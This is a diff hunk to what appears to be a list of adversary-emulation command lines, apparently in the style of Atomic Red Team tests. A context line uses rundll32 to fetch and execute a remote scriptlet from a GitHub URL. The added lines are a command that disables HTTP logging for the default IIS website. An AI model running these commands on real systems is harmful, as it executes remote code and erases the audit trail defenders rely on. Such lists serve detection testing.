@@ -236,6 +236,12 @@ powershell -Command "Start-Process -FilePath $Env:windir\System32\WindowsPowerSh
 ******************
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
 
+***********
+ Disable Windows IIS HTTP Logging
+
+ C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httpLogging /dontLog:true
+
+
 
 
 
